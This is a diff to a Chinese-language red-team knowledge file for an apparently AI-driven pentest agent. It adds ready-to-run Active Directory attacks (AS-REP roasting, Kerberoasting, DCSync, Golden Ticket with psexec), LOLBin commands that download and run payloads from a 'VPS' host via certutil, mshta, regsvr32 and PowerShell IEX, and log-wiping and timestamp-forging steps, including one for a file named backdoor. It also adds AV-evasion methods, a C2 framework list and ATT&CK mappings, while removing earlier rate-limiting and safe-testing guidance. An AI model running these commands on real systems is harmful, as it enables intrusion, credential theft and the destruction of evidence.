+└─────────────────────────────────────────────────────────┘
 ```
-
-#### 各工具限速配置
 
 ```bash
-# ═══ httpx ═══
-httpx -rl 2 -t 2 -l urls.txt              # 2 req/s, 2 线程
+# AS-REP Roasting（不需任何凭据）
+python3 GetNPUsers.py CORP.LOCAL/ -dc-ip DC_IP -usersfile users.txt -format hashcat
 
-# ═══ nuclei ═══
-nuclei -rl 3 -c 2 -bs 3 -l targets.txt    # 3 req/s, 2 并发
+# Kerberoasting（需要域用户凭据）
+python3 GetUserSPNs.py CORP.LOCAL/user:pass -dc-ip DC_IP -request
+# 破解：
+hashcat -m 13100 kerberoast.hash rockyou.txt
 
-# ═══ ffuf ═══
-ffuf -u https://target.com/FUZZ -w list.txt -rate 2 -t 1
+# DCSync（需要域管或复制权限）
+python3 secretsdump.py CORP/admin:pass@DC_IP
 
-# ═══ gobuster ═══
-gobuster dir -u https://target.com -w list.txt -t 1 --delay 1000ms
-
-# ═══ nmap（超慢但安全） ═══
-nmap -T1 --max-rate 5 --max-retries 1 --scan-delay 2s target.com
-
-# ═══ sqlmap ═══
-sqlmap -u "url" --delay=2 --timeout=30 --retries=1 \
-  --safe-freq=3 --safe-url="https://target.com/"
-
-# ═══ dirsearch ═══
-dirsearch -u https://target.com -t 2 --delay=1
-
-# ═══ arjun ═══
-arjun -u https://target.com/api -t 2 --stable
+# Golden Ticket 制作
+python3 ticketer.py -nthash KRBTGT_HASH -domain-sid S-1-5-21-xxx -domain CORP.LOCAL Administrator
+export KRB5CCNAME=Administrator.ccache
+python3 psexec.py -k -no-pass CORP.LOCAL/Administrator@DC_IP
 ```
 
-#### Python 脚本限速模板
+#### AD 攻击工具速查
+
+| 工具 | 用途 | 链接 |
+|------|------|------|
+| **BloodHound** | AD 攻击路径可视化 | https://github.com/BloodHoundAD/BloodHound |
+| **Impacket** | Python AD 协议套件 | https://github.com/fortra/impacket |
+| **Rubeus** | Kerberos 攻击工具 | https://github.com/GhostPack/Rubeus |
+| **Certify** | ADCS 证书攻击 | https://github.com/GhostPack/Certify |
+| **Certipy** | Python 版 ADCS 攻击 | https://github.com/ly4k/Certipy |
+| **SharpHound** | BloodHound 数据采集 | BloodHound 内置 |
+| **PowerView** | PowerShell AD 枚举 | PowerSploit 套件 |
+| **ADModule** | .NET AD 模块 | https://github.com/samratashok/ADModule |
+
+
+### 20.9 免杀对抗基础
+
+#### 免杀方法分类
+
+| 方法 | 原理 | 工具 |
+|------|------|------|
+| **加壳/加密** | 改变特征码 | UPX/VMProtect/Themida |
+| **Shellcode 加载器** | 分离免杀 | C/Go/Rust/Nim 自写加载器 |
+| **内存加载** | 不落盘 | 反射DLL/Donut/BOF |
+| **AMSI 绕过** | 禁用脚本扫描 | 内存 Patch amsi.dll |
+| **ETW 绕过** | 禁用日志追踪 | Patch EtwEventWrite |
+| **签名伪造** | 假冒合法签名 | SigThief |
+| **白名单利用** | LOLBins | rundll32/mshta/certutil |
+| **间接系统调用** | 绕过 hook | SysWhispers/HellsGate |
+
+#### LOLBins（Living off the Land）常用
+
+```powershell
+# certutil 下载文件
+certutil -urlcache -split -f http://VPS/payload.exe C:\temp\payload.exe
+
+# mshta 执行 HTA
+mshta http://VPS/evil.hta
+
+# rundll32 执行 DLL
+rundll32 shell32.dll,Control_RunDLL payload.dll
+
+# regsvr32 无文件执行
+regsvr32 /s /n /u /i:http://VPS/evil.sct scrobj.dll
+
+# bitsadmin 下载
+bitsadmin /transfer job /download /priority high http://VPS/payload.exe C:\temp\payload.exe
+
+# PowerShell 下载执行
+powershell -nop -w hidden -ep bypass -c "IEX(New-Object Net.WebClient).DownloadString('http://VPS/ps.ps1')"
+
+# wmic 远程执行
+wmic /node:target process call create "cmd /c payload.exe"
+```
+
+### 20.10 痕迹清理
+
+```powershell
+# Windows 清理
+wevtutil cl Security        # 清安全日志
+wevtutil cl System          # 清系统日志
+wevtutil cl Application     # 清应用日志
+del /f /q %USERPROFILE%\AppData\Local\Temp\*  # 清临时文件
+# 修改文件时间戳
+powershell (Get-Item file.exe).LastWriteTime = '2023-01-01 08:00:00'
+```
+
+```bash
+# Linux 清理
+echo > /var/log/auth.log     # 清认证日志
+echo > /var/log/syslog       # 清系统日志
+echo > /var/log/wtmp         # 清登录记录
+echo > /var/log/lastlog      # 清最后登录
+echo > ~/.bash_history       # 清命令历史
+history -c                   # 清当前会话历史
+unset HISTFILE               # 不记录后续命令
+# 修改文件时间戳
+touch -r /etc/passwd /tmp/backdoor  # 与参考文件同时间
+```
+
+
+
+---
+
+## 二十一、AI 驱动渗透测试工具（2025-2026 最新）
+
+> 来源：GitHub 开源社区、appsecsanta.com 研究报告、各项目官方文档
+> 截至 2026 年，已有 39+ 开源 AI 渗透 Agent 项目，覆盖 6 种架构模式
+
+### 21.1 AI 渗透工具全景图
+
+```
+AI 渗透测试工具生态（2025-2026）
+├── 单 Agent 架构
+│   ├── AI-OPS（开源 LLM）
+│   └── Auto-Pentest-GPT-AI（Armur-Ai）
+│
+├── 多 Agent Planner-Executor 架构
+│   ├── PentAGI（全自主，Docker 隔离）
+│   └── pentest-agent（学术论文级）
+│
+├── 专业角色分工架构
+│   ├── Pentest-Swarm-AI（侦察/分类/利用/报告 4 专家）
+│   └── pentest-agent-system（MITRE ATT&CK 映射）
+│
+├── 群体智能（Swarm）架构
+│   └── Pentest-Swarm-AI（Go + Claude API）
+│
+├── MCP Server 架构
+│   ├── HexStrike AI（70+ 工具 MCP）
+│   ├── PentestAgent（GH05TCREW）
+│   └── pentest-ai（0xSteph，197+ 工具）
+│
+└── Claude Code Native 架构
+    ├── pentest-ai-agents（31 专业子 Agent）
+    └── Bai-codeagent（本项目）
+```
+
+### 21.2 重点项目详解
+
+#### PentAGI — 全自主 AI 渗透系统
+
+| 属性 | 值 |
+|------|---|
+| **仓库** | https://github.com/vxcontrol/pentagi |
+| **架构** | 多 Agent + Docker 隔离执行环境 |
+| **语言** | Go + TypeScript |
+| **LLM** | 支持 OpenAI/Claude/本地模型 |
+| **特点** | 全自主决策、任务分解、工具自动调用、Web UI |
+
+核心能力：
+- 自主规划渗透路径
+- Docker 容器内安全执行命令
+- 上下文记忆 + 任务链管理
+- 结果自动分析和报告生成
+- Web 界面实时监控进度
+
+
+#### Pentest-Swarm-AI — 群体智能渗透
+
+| 属性 | 值 |
+|------|---|
+| **仓库** | https://github.com/Armur-Ai/Pentest-Swarm-AI |
+| **架构** | Swarm 多 Agent + ReAct 推理 |
+| **语言** | Go |
+| **LLM** | Claude API |
+| **模式** | Bug Bounty / 持续监控 / CTF |
+
+Agent 角色分工：
+```
+┌────────────────────────────────────────────────┐
+│              Orchestrator（编排者）              │
+├────────────────────────────────────────────────┤
+│  Recon Agent     → 侦察（子域名/端口/指纹）    │
+│  Classifier Agent → 资产分类 + 优先级排序       │
+│  Exploit Agent   → 漏洞利用 + PoC 验证         │
+│  Report Agent    → 报告生成 + 修复建议          │
+└────────────────────────────────────────────────┘
+```
+
+特色：
+- ReAct（Reasoning + Acting）推理循环
+- 7+ 内置安全工具原生集成
+- 支持 Bug Bounty、持续监控、CTF 三种模式
+- Go 语言高并发性能
+
+#### GH05TCREW/PentestAgent — MCP 架构工具箱
+
+| 属性 | 值 |
+|------|---|
+| **仓库** | https://github.com/GH05TCREW/PentestAgent |
+| **架构** | MCP Server + RAG 知识库 |
+| **集成工具** | Nmap, Metasploit, FFUF, SQLMap, Hydra |
+| **模式** | 辅助对话 / 自主 Agent / 多Agent Crew |
+| **界面** | TUI（终端用户界面） |
+
+核心能力：
+- 预置攻击 Playbook（自动化攻击序列）
+- RAG 本地知识库（OWASP/CVE/漏洞利用文档）
+- MCP 协议连接外部工具
+- Chromium 浏览器实例（Playwright Web 漏洞测试）
+- 自主决策下一步操作
+
+
+#### HexStrike AI — 70+ 工具 MCP Server
+
+| 属性 | 值 |
+|------|---|
+| **仓库** | https://github.com/0x4m4/hexstrike-ai |
+| **架构** | MCP Server（让任何 AI Agent 调用安全工具） |
+| **兼容** | Claude Desktop / Cursor / GPT / Copilot |
+| **工具数** | 70+ 安全工具 |
+
+工具分类：
+- 侦察：Nmap, Amass, Subfinder, WHOIS
+- Web 扫描：Nikto, WhatWeb, Wappalyzer
+- 漏洞扫描：Nuclei, SQLMap, XSStrike
+- 爆破：Hydra, Hashcat, John
+- 后渗透：LinPEAS, WinPEAS
+- 网络：Wireshark, TCPDump
+- 密码学：CyberChef
+
+#### 0xSteph/pentest-ai — 197+ 工具最全 MCP
+
+| 属性 | 值 |
+|------|---|
+| **仓库** | https://github.com/0xSteph/pentest-ai |
+| **架构** | MCP Server + Python Agent |
+| **工具数** | 197+ |
+| **特色** | Exploit Chaining + PoC 自动验证 |
+
+#### pentest-ai-agents — Claude Code 31 专业子 Agent
+
+| 属性 | 值 |
+|------|---|
+| **来源** | vpncentral.com 报道 |
+| **架构** | Claude Code Native（子 Agent 模式）|
+| **Agent 数** | 31 个专业子 Agent |
+| **场景** | 授权渗透测试 |
+
+子 Agent 示例：
+- Web 应用测试 Agent
+- API 安全 Agent
+- 认证绕过 Agent
+- 提权 Agent
+- 报告生成 Agent
+
+
+### 21.3 其他值得关注的项目
+
+| 项目 | 架构 | 特点 | 链接 |
+|------|------|------|------|
+| **antoninoLorenzo/AI-OPS** | 单Agent | 基于开源 LLM，无需 API 费用 | https://github.com/antoninoLorenzo/AI-OPS |
+| **nbshenxm/pentest-agent** | Planner-Executor | 学术论文支撑（ACM发表） | https://github.com/nbshenxm/pentest-agent |
+| **youngsecurity/pentest-agent-system** | MITRE ATT&CK | 按 ATT&CK 框架自主执行 | https://github.com/youngsecurity/pentest-agent-system |
+| **Armur-Ai/Auto-Pentest-GPT-AI** | 单Agent | LLM 驱动的软件渗透测试 | https://github.com/Armur-Ai/Auto-Pentest-GPT-AI |
+| **shlomihod/awesome-ai-red-teaming** | 资源列表 | AI 红队（对抗ML模型） | https://github.com/shlomihod/awesome-ai-red-teaming |
+
+### 21.4 架构对比与选型建议
+
+| 架构 | 优势 | 劣势 | 适用场景 |
+|------|------|------|---------|
+| **单 Agent** | 简单、低成本 | 能力有限、易卡死 | 单点漏洞验证 |
+| **Planner-Executor** | 任务分解清晰 | 规划质量依赖 LLM | 完整渗透流程 |
+| **专业角色** | 各司其职、效率高 | 协调复杂 | 团队化红队 |
+| **Swarm** | 高并发、自适应 | 资源消耗大 | 大规模资产 |
+| **MCP Server** | 工具集成灵活 | 需要 MCP 客户端 | 工具桥接 |
+| **Claude Code Native** | 与 IDE 深度集成 | 依赖 Claude | 日常安全开发 |
+
+**结论：多 Agent 架构始终优于单 Agent，推荐 Planner-Executor 或 Swarm 模式。**
+
+### 21.5 与 Bai-codeagent 的整合建议
+
+```
+当前 Bai-codeagent 架构（Claude Code Native + Auto Agent）
+可以吸收的能力：
+
+1. 从 PentAGI 学习：
+   - Docker 隔离执行（安全运行危险命令）
+   - Web UI 实时监控
+
+2. 从 Pentest-Swarm-AI 学习：
+   - ReAct 推理循环（更智能的决策）
+   - Go 高并发多 Agent 执行
+
+3. 从 PentestAgent 学习：
+   - RAG 知识库（将 know.md 向量化）
+   - 预置 Playbook（标准化攻击序列）
+
+4. 从 HexStrike 学习：
+   - 扩充 MCP 工具集（当前 15 → 目标 70+）
+   - 标准化工具接口
+
+5. 从 pentest-ai 学习：
+   - Exploit Chain 自动构建
+   - PoC 自动验证流水线
+```
+
+
+### 21.6 AI 渗透 Agent 开发要点
+
+#### 核心设计模式
 
 ```python
-import asyncio
-import random
-import time
-
-class RateLimiter:
-    """安全限速器"""
-    def __init__(self, requests_per_second=2, jitter=True):
-        self.interval = 1.0 / requests_per_second
-        self.jitter = jitter
-        self.last_request = 0
+# ReAct 循环（Reasoning + Acting）
+while not task_complete:
+    # 1. 观察（Observe）
+    observation = get_current_state()
     
-    async def wait(self):
-        """等待到可以发送下一个请求"""
-        elapsed = time.time() - self.last_request
-        wait_time = self.interval - elapsed
-        if self.jitter:
-            wait_time += random.uniform(0.1, 0.5)  # 随机抖动
-        if wait_time > 0:
-            await asyncio.sleep(wait_time)
-        self.last_request = time.time()
-
-# 使用：
-limiter = RateLimiter(requests_per_second=2)
-
-async def safe_request(url):
-    await limiter.wait()
-    # ... 发送请求
+    # 2. 思考（Think）
+    thought = llm.reason(f"""
+        目标: {target}
+        已知信息: {knowledge_base}
+        当前观察: {observation}
+        历史操作: {action_history}
+        
+        下一步应该做什么？为什么？
+    """)
+    
+    # 3. 行动（Act）
+    action = llm.decide_action(thought, available_tools)
+    result = execute_tool(action)
+    
+    # 4. 更新状态
+    knowledge_base.update(result)
+    action_history.append((action, result))
+    
+    # 5. 判断是否完成
+    task_complete = llm.evaluate_completion(knowledge_base)
 ```
 
-### 19.7 HTTP 请求去特征化（不被日志标记为扫描器）
-
-#### User-Agent 伪装
-
-```bash
-# ❌ 千万不要用默认 UA：
-# python-requests/2.28.0
-# Go-http-client/1.1
-# sqlmap/1.7
-# Nuclei/3.0
-
-# ✅ 使用真实浏览器 UA（随机轮换）：
-UA_LIST=(
-  "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/125.0.0.0 Safari/537.36"
-  "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.5 Safari/605.1.15"
-  "Mozilla/5.0 (X11; Linux x86_64; rv:128.0) Gecko/20100101 Firefox/128.0"
-  "Mozilla/5.0 (iPhone; CPU iPhone OS 17_5 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.5 Mobile/15E148 Safari/604.1"
-)
-# 随机选择：
-UA="${UA_LIST[$RANDOM % ${#UA_LIST[@]}]}"
-curl -H "User-Agent: $UA" https://target.com
-```
-
-#### 完整浏览器头伪装
-
-```bash
-curl -s https://target.com \
-  -H "User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 Chrome/125.0.0.0 Safari/537.36" \
-  -H "Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8" \
-  -H "Accept-Language: zh-CN,zh;q=0.9,en;q=0.8" \
-  -H "Accept-Encoding: gzip, deflate, br" \
-  -H "Connection: keep-alive" \
-  -H "Upgrade-Insecure-Requests: 1" \
-  -H "Sec-Fetch-Dest: document" \
-  -H "Sec-Fetch-Mode: navigate" \
-  -H "Sec-Fetch-Site: none"
-```
-
-#### 行为模拟（像真人浏览）
+#### 安全执行要点
 
 ```
-✅ 正确做法：
-- 先访问首页 → 再访问子页面（模拟浏览路径）
-- 请求间加随机延迟（0.5-3 秒随机，不是固定间隔）
-- 偶尔访问 CSS/JS/图片（真实浏览器都会加载这些）
-- 使用 Referer 头（从上一个页面跳转过来）
-- Cookie 保持一致（不要每次请求都像新会话）
+1. 命令执行沙箱
+   - Docker 容器隔离（PentAGI 模式）
+   - 网络命名空间限制
+   - 文件系统只读挂载
 
-❌ 扫描器特征（会被日志标记）：
-- 固定 1 秒间隔请求（机器人特征）
-- 短时间大量 404（目录爆破）
-- 没有 Cookie 的连续请求
-- 请求路径无逻辑（/a → /zzz → /admin → /b）
-- 不加载任何静态资源
+2. 工具调用审批
+   - Phase-Aware 阶段限制（本项目已有）
+   - 危险命令二次确认
+   - 速率限制 + 资源预算
+
+3. 输出过滤
+   - 敏感信息自动脱敏
+   - 避免泄露目标凭据
+   - 日志分级存储
+
+4. 知识库管理
+   - RAG 实时检索相关知识
+   - 攻击经验持久化
+   - 误报/漏报反馈学习
 ```
 
-### 19.8 DNS 隐蔽查询
 
-```bash
-# ═══ 使用 DoH（DNS over HTTPS）避免 DNS 日志 ═══
 
-# Cloudflare DoH
-curl -s "https://cloudflare-dns.com/dns-query?name=target.com&type=A" \
-  -H "accept: application/dns-json" | jq '.Answer[].data'
+---
 
-# Google DoH
-curl -s "https://dns.google/resolve?name=target.com&type=A" | jq '.Answer[].data'
+## 二十二、MITRE ATT&CK 红队映射
 
-# ═══ 系统级 DoH（永久生效） ═══
-# /etc/systemd/resolved.conf:
-# [Resolve]
-# DNS=1.1.1.1#cloudflare-dns.com
-# DNSOverTLS=yes
-# DNSSEC=yes
+> MITRE ATT&CK 是全球通用的攻击行为知识库，将攻击者的 TTP（战术/技术/过程）标准化
+> 官方网站：https://attack.mitre.org
+> 参考：0xsyr0/Red-Team-Playbooks、youngsecurity/pentest-agent-system
 
-systemctl restart systemd-resolved
-
-# ═══ 子域名枚举时用被动方式（不产生 DNS 查询） ═══
-# 被动枚举（不发 DNS 请求）：
-subfinder -d target.com -silent    # 使用 API 被动收集
-
-# 主动枚举（会产生 DNS 请求）：
-# 走 Tor/代理，不暴露真实 IP
-proxychains4 dnsx -d target.com -w subdomains.txt
-```
-
-### 19.9 被封 IP 后的应对
+### 22.1 ATT&CK 矩阵总览（Enterprise）
 
 ```
-发现被封的信号：
-- 连续返回 403/429/503
-- 响应中出现"IP 已被封禁"/"请完成人机验证"
-- 响应时间突然变长（进入黑洞路由）
-- 正常页面突然返回空白
-
-应对步骤：
-1. 立即停止所有对该目标的请求
-2. 等待 30 分钟 - 1 小时
-3. 切换到备用 VPS / 新 IP
-4. 降低请求频率到 1 req/s
-5. 如果持续被封：
-   - 换 Residential 代理
-   - 使用 Cloudflare Workers 中转
-   - 换目标，过几天再回来
+┌──────────────────────────────────────────────────────────────────────────────┐
+│                    MITRE ATT&CK Enterprise 14 大战术                          │
+├──────────────────────────────────────────────────────────────────────────────┤
+│                                                                              │
+│  TA0043        TA0042          TA0001          TA0002         TA0003         │
+│  Reconnaissance Resource Dev   Initial Access  Execution      Persistence    │
+│  侦察          资源开发         初始访问         执行           持久化         │
+│                                                                              │
+│  TA0004        TA0005          TA0006          TA0007         TA0008         │
+│  Privilege     Defense         Credential      Discovery      Lateral        │
+│  Escalation    Evasion         Access          发现           Movement       │
+│  提权          防御绕过         凭据获取                        横向移动       │
+│                                                                              │
+│  TA0009        TA0011          TA0010          TA0040                        │
+│  Collection    Command &       Exfiltration    Impact                        │
+│  数据收集      Control (C2)    数据窃取         影响/破坏                     │
+│                                                                              │
+└──────────────────────────────────────────────────────────────────────────────┘
 ```
 
-### 19.10 避免影响目标正常运行
+### 22.2 各战术阶段 — 常用技术与工具映射
+
+#### TA0043 侦察（Reconnaissance）
+
+| ATT&CK ID | 技术 | 对应工具/方法 |
+|-----------|------|-------------|
+| T1595.001 | 主动扫描 - IP 段 | Nmap, Masscan, Zmap |
+| T1595.002 | 主动扫描 - 漏洞 | Nuclei, Nessus, AWVS |
+| T1593.001 | 搜索开放网站 - 社交媒体 | OSINT, LinkedIn |
+| T1593.002 | 搜索开放网站 - 搜索引擎 | Google Dorking, FOFA |
+| T1596.001 | 搜索公开数据 - DNS | subfinder, amass |
+| T1596.005 | 搜索公开数据 - 扫描数据库 | Shodan, Censys |
+| T1589 | 收集受害者身份信息 | theHarvester, Hunter.io |
+| T1590 | 收集受害者网络信息 | whois, BGP查询 |
+| T1592 | 收集受害者主机信息 | Wappalyzer, WhatWeb |
+
+
+#### TA0001 初始访问（Initial Access）
+
+| ATT&CK ID | 技术 | 对应工具/方法 |
+|-----------|------|-------------|
+| T1190 | 利用公开应用漏洞 | SQLMap, Nuclei, Metasploit |
+| T1133 | 外部远程服务 | VPN漏洞, RDP爆破 |
+| T1566.001 | 钓鱼 - 附件 | GoPhish, 宏文档 |
+| T1566.002 | 钓鱼 - 链接 | Evilginx2, Gophish |
+| T1078 | 合法账户 | 弱口令, 凭据泄露 |
+| T1199 | 信任关系 | 供应链攻击 |
+| T1189 | 水坑攻击 | BeEF, 恶意JS注入 |
+| T1195 | 供应链攻击 | 恶意包, 依赖混淆 |
+
+#### TA0002 执行（Execution）
+
+| ATT&CK ID | 技术 | 对应工具/方法 |
+|-----------|------|-------------|
+| T1059.001 | PowerShell | PowerShell Empire, ps1 脚本 |
+| T1059.003 | Windows CMD | cmd.exe, bat 脚本 |
+| T1059.004 | Unix Shell | bash, sh, 反弹shell |
+| T1059.005 | Visual Basic | VBA 宏, VBS 脚本 |
+| T1059.006 | Python | Python 远控, impacket |
+| T1047 | WMI | wmiexec.py, wmic |
+| T1053.005 | 计划任务 | schtasks, cron |
+| T1569.002 | 系统服务 | sc.exe, PsExec |
+| T1204 | 用户执行 | 钓鱼诱导点击 |
+
+#### TA0003 持久化（Persistence）
+
+| ATT&CK ID | 技术 | 对应工具/方法 |
+|-----------|------|-------------|
+| T1547.001 | 注册表 Run 键 | reg add, PowerShell |
+| T1053.005 | 计划任务 | schtasks /create |
+| T1546.003 | WMI 事件订阅 | PowerShell WMI |
+| T1543.003 | Windows 服务 | sc create |
+| T1136 | 创建账户 | net user /add |
+| T1098 | 账户操纵 | 添加到管理员组 |
+| T1556 | 修改认证过程 | PAM后门, Skeleton Key |
+| T1505.003 | Web Shell | 蚁剑, 冰蝎, 哥斯拉 |
+| T1554 | 植入客户端 | DLL劫持 |
+
+
+#### TA0004 提权（Privilege Escalation）
+
+| ATT&CK ID | 技术 | 对应工具/方法 |
+|-----------|------|-------------|
+| T1068 | 利用漏洞提权 | 内核EXP, Windows-Exploit-Suggester |
+| T1055 | 进程注入 | DLL注入, 进程镂空 |
+| T1134 | 访问令牌操纵 | Incognito, Token窃取 |
+| T1548.002 | UAC 绕过 | UACME, FodHelper |
+| T1078 | 合法账户 | 窃取管理员凭据 |
+| T1574.001 | DLL 劫持 | 替换可写DLL路径 |
+| T1574.002 | DLL 侧加载 | 合法程序加载恶意DLL |
+| T1053.005 | 计划任务 | SYSTEM 权限计划任务 |
+| T1484 | 域策略修改 | GPO 后门 |
+
+#### TA0005 防御绕过（Defense Evasion）
+
+| ATT&CK ID | 技术 | 对应工具/方法 |
+|-----------|------|-------------|
+| T1027 | 混淆文件/信息 | 加壳, 编码, 加密 |
+| T1055 | 进程注入 | 反射DLL, APC注入 |
+| T1070.001 | 清除日志 | wevtutil cl |
+| T1070.004 | 删除文件 | 删除工具和痕迹 |
+| T1562.001 | 禁用安全工具 | 停止 AV 服务 |
+| T1562.002 | 禁用日志 | ETW Patch |
+| T1036 | 伪装 | 重命名为系统进程名 |
+| T1140 | 反混淆/解码 | certutil -decode |
+| T1218 | 系统签名二进制代理执行 | LOLBins (mshta/rundll32) |
+| T1620 | 反射代码加载 | Donut, 内存加载 |
+
+#### TA0006 凭据获取（Credential Access）
+
+| ATT&CK ID | 技术 | 对应工具/方法 |
+|-----------|------|-------------|
+| T1003.001 | LSASS 内存 | Mimikatz, procdump |
+| T1003.002 | SAM 数据库 | reg save, secretsdump |
+| T1003.003 | NTDS.dit | ntdsutil, DCSync |
+| T1003.006 | DCSync | Mimikatz lsadump::dcsync |
+| T1558.003 | Kerberoasting | GetUserSPNs.py, Rubeus |
+| T1558.004 | AS-REP Roasting | GetNPUsers.py |
+| T1110 | 暴力破解 | Hydra, Hashcat, John |
+| T1552.001 | 文件中的凭据 | grep, TruffleHog |
+| T1555 | 密码存储 | 浏览器密码, Vault |
+| T1557 | 中间人 | Responder, mitm6 |
+
+
+#### TA0007 发现（Discovery）
+
+| ATT&CK ID | 技术 | 对应工具/方法 |
+|-----------|------|-------------|
+| T1087 | 账户发现 | net user, Get-ADUser |
+| T1082 | 系统信息发现 | systeminfo, uname -a |
+| T1083 | 文件/目录发现 | dir, find, tree |
+| T1046 | 网络服务扫描 | Nmap, Masscan |
+| T1135 | 网络共享发现 | net share, smbclient |
+| T1069 | 权限组发现 | net group, BloodHound |
+| T1016 | 系统网络配置 | ipconfig, ifconfig |
+| T1049 | 系统网络连接 | netstat, ss |
+| T1018 | 远程系统发现 | net view, ping sweep |
+| T1482 | 域信任发现 | nltest, Get-ADTrust |
+
+#### TA0008 横向移动（Lateral Movement）
+
+| ATT&CK ID | 技术 | 对应工具/方法 |
+|-----------|------|-------------|
+| T1021.001 | RDP | xfreerdp, mstsc |
+| T1021.002 | SMB/Admin共享 | PsExec, smbexec |
+| T1021.003 | DCOM | dcomexec.py |
+| T1021.004 | SSH | ssh, Paramiko |
+| T1021.006 | WinRM | evil-winrm, winrs |
+| T1047 | WMI | wmiexec.py, wmic |
+| T1550.002 | Pass the Hash | pth-winexe, Mimikatz |
+| T1550.003 | Pass the Ticket | Rubeus ptt |
+| T1563.002 | RDP 劫持 | tscon.exe |
+| T1570 | 工具横向传输 | SMB/SCP复制 |
+
+#### TA0011 命令与控制（C2）
+
+| ATT&CK ID | 技术 | 对应工具/框架 |
+|-----------|------|-------------|
+| T1071.001 | Web 协议 (HTTP/S) | Cobalt Strike, Sliver |
+| T1071.004 | DNS 协议 | DNScat2, Cobalt Strike DNS |
+| T1572 | 协议隧道 | Chisel, frp, SSH隧道 |
+| T1573 | 加密通道 | HTTPS C2, WireGuard |
+| T1090 | 代理 | SOCKS代理, 多级跳板 |
+| T1105 | 远程文件传输 | certutil, curl, wget |
+| T1132 | 数据编码 | Base64, 自定义编码 |
+| T1568 | 动态域名解析 | DGA, Fast-flux |
+| T1102 | Web 服务 | GitHub/Telegram/Slack C2 |
+
+
+#### TA0010 数据窃取（Exfiltration）
+
+| ATT&CK ID | 技术 | 对应工具/方法 |
+|-----------|------|-------------|
+| T1041 | 通过 C2 通道 | Cobalt Strike download |
+| T1048.001 | 通过替代协议 - 加密 | HTTPS, DNS隧道 |
+| T1048.003 | 通过替代协议 - 未加密 | FTP, ICMP隧道 |
+| T1567 | 通过 Web 服务 | Dropbox, Google Drive |
+| T1029 | 计划传输 | 定时打包外传 |
+| T1030 | 数据传输限制 | 分块传输避免告警 |
+| T1537 | 传输到云账户 | 云存储 API |
+
+### 22.3 C2 框架速查
+
+| 框架 | 语言 | 协议 | 特点 | 链接 |
+|------|------|------|------|------|
+| **Cobalt Strike** | Java | HTTP/S/DNS/SMB | 商业首选，功能最全 | 商业 |
+| **Sliver** | Go | HTTP/S/DNS/mTLS/WG | 开源，现代化替代CS | https://github.com/BishopFox/sliver |
+| **Havoc** | C/C++ | HTTP/S | 开源，类CS界面 | https://github.com/HavocFramework/Havoc |
+| **Mythic** | Go/Python | 多协议 | 插件化，多语言Agent | https://github.com/its-a-feature/Mythic |
+| **Covenant** | C# | HTTP/S | .NET 专注 | https://github.com/cobbr/Covenant |
+| **Villain** | Python | HTTP/S | 轻量级，反弹shell管理 | https://github.com/t3l3machus/Villain |
+| **Merlin** | Go | HTTP/2/3, QUIC | HTTP/3协议隐蔽 | https://github.com/Ne0nd0g/merlin |
+| **PoshC2** | Python/PS | HTTP/S | PowerShell 生态 | https://github.com/nettitude/PoshC2 |
+
+### 22.4 ATT&CK 在报告中的应用
+
+#### 漏洞报告 TTP 标签示例
+
+```markdown
+## 漏洞：SQL 注入 → 数据库凭据泄露 → 横向移动
+
+### ATT&CK 映射：
+- **初始访问**: T1190 (Exploit Public-Facing Application)
+- **执行**: T1059.004 (Unix Shell)  
+- **凭据获取**: T1552.001 (Credentials In Files)
+- **横向移动**: T1021.004 (SSH)
+- **数据窃取**: T1048.001 (Exfil Over Encrypted Channel)
+
+### 攻击链：
+T1190 → T1059.004 → T1552.001 → T1021.004 → T1048.001
+
+### 影响：
+攻击者可通过 SQL 注入获取数据库中的 SSH 凭据，
+横向移动至内网其他服务器，窃取敏感数据。
+```
+
+
+#### auto_hunt findings 添加 ATT&CK 标签
+
+```python
+# 在 auto_hunt.py 的 findings 中加入 ATT&CK 标签
+finding = {
+    "type": "sqli",
+    "severity": "critical",
+    "url": "https://target.com/api/users?id=1",
+    "evidence": "...",
+    # 新增 ATT&CK 映射
+    "attack_mapping": {
+        "tactic": "Initial Access",
+        "tactic_id": "TA0001",
+        "technique": "Exploit Public-Facing Application",
+        "technique_id": "T1190",
+        "kill_chain_phase": "exploitation",
+    }
+}
+```
+
+### 22.5 ATT&CK Navigator — 可视化工具
 
 ```
-⚠️ SRC 生产环境保护原则：
+ATT&CK Navigator 是 MITRE 官方的交互式矩阵可视化工具：
+- 在线版：https://mitre-attack.github.io/attack-navigator/
+- 用途：标注已测试/已发现的技术覆盖度
+- 导出：JSON/SVG/Excel 多格式
 
-1. 【不做压力测试】
-   - 不并发超过 5 个连接
-   - 不发送超大 payload（> 1MB）
-   - 不循环请求同一接口
-
-2. 【不做破坏性操作】
-   - SQLi: 只用 AND 1=1 验证，不 DROP/DELETE
-   - XSS: 只 alert(1) 验证，不做钓鱼
-   - RCE: 只 whoami/id 验证，不植入后门
-   - 文件上传: 只传 .txt 验证，不传 webshell
-   - SSRF: 只 DNS 外带验证，不扫内网
-
-3. 【选择测试时间】
-   - 优选凌晨 2:00-6:00（流量最低）
-   - 避开工作日 9:00-18:00 高峰
-   - 避开促销活动期间
-
-4. 【监控目标状态】
-   - 测试前确认目标正常响应
-   - 测试中定期检查是否影响响应时间
-   - 发现响应变慢立即停止
-
-5. 【数据最小化】
-   - IDOR 验证只看 1-2 条数据
-   - 不下载/导出大量用户信息
-   - 截图证明后立即停止
+使用场景：
+1. 红队评估报告 — 展示攻击覆盖面
+2. 防御差距分析 — 哪些技术未被检测
+3. 威胁建模 — 模拟 APT 组织的 TTP
 ```
 
-### 19.11 你的工具中已有的安全机制
+### 22.6 常见 APT 组织 TTP 特征
 
-你的 `claude-hunt/auto_agent/config.yaml` 中推荐配置：
+| APT 组织 | 常用初始访问 | 常用工具/恶意软件 | 目标行业 |
+|----------|------------|-----------------|---------|
+| APT28 (Fancy Bear) | 钓鱼邮件 | X-Agent, Zebrocy | 政府/军事 |
+| APT29 (Cozy Bear) | 供应链攻击 | Sunburst, EnvyScout | 政府/IT |
+| Lazarus | 水坑+钓鱼 | BLINDINGCAN, DTrack | 金融/加密货币 |
+| APT41 | 供应链+Web漏洞 | ShadowPad, Winnti | 游戏/电信 |
